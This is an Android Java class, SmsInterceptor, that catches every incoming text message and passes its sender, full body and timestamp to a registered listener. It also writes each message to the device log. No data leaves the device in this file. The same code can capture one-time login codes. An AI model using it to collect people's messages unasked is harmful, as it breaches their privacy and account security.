package com.my.luck.features;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SmsInterceptor extends BroadcastReceiver {
    private static final String TAG = "SmsInterceptor";
    private static SmsInterceptorListener listener;

    public interface SmsInterceptorListener {
        void onSmsReceived(String sender, String message, String timestamp);
    }

    public static void setListener(SmsInterceptorListener listener) {
        SmsInterceptor.listener = listener;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        try {
                            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                            String sender = sms.getDisplayOriginatingAddress();
                            String body = sms.getMessageBody();
                            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                                    .format(new Date(sms.getTimestampMillis()));
                            
                            Log.d(TAG, "SMS Intercepted: " + sender + " - " + body);
                            
                            if (listener != null) {
                                listener.onSmsReceived(sender, body, timestamp);
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "Error processing SMS", e);
                        }
                    }
                }
            }
        }
    }
}